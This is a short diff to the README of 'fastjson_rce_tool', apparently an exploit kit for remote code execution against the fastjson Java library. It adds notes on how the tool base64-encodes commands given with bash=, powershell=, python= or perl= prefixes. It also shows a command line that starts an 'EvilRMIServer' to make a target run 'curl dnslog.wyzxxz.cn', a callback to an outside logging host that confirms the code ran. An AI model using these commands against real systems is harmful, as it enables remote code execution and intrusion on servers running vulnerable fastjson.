@@ -1,6 +1,9 @@
 # fastjson_rce_tool
 
 ```
+if command need base64 command, input should startwith bash=/powershell=/python=/perl=
+example:  bash=curl dnslog.wyzxxz.cn
+
 1. RMI (need tomcat8)
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
